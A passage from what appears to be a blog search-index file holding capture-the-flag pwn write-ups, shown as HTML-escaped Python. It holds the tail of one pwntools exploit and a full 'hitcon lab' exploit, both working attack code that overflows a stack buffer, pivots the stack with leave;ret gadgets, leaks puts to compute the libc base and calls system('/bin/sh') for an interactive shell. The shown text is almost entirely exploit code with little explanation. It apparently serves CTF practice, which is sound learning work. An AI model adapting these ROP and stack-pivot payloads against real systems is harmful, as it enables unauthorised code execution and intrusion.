class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">2</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;aabb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;ebp&quot;</span>,ebp)</span><br><span class="line">sh = ebp-<span class="number">0x38</span>+<span class="number">16</span></span><br><span class="line">rop = flat([<span class="number">0</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="number">0</span>,sh,<span class="string">b&#x27;/bin&#x27;</span>,<span class="string">b&#x27;/sh\x00&#x27;</span>])</span><br><span class="line">payload = rop.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="hitcon-lab"><a href="#hitcon-lab" class="headerlink" title="hitcon lab"></a>hitcon lab</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;192.168.6.128&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x804ae00</span></span><br><span class="line">buf2 = buf+<span class="number">0x200</span></span><br><span class="line"><span class="comment">#这两个buf是data段靠后的那一块任取的	</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">rop = flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>])</span><br><span class="line">payload += rop</span><br><span class="line">s(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">pop1ret = <span class="number">0x0804836d</span></span><br><span class="line">rop2 = flat([buf2,elf.plt[<span class="string">&#x27;puts&#x27;</span>],pop1ret,elf.got[<span class="string">&#x27;puts&#x27;</span>],read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">0x100</span>])</span><br><span class="line">sl(rop2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">puts = u32(p.recvline().strip())</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base = puts - <span class="number">0x732a0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + <span class="number">0x48170</span></span><br><span class="line">sh = buf2 + <span class="number">16</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">rop3 = flat([buf,system,<span class="number">0</span>,sh,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">sl(rop3)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
</search>
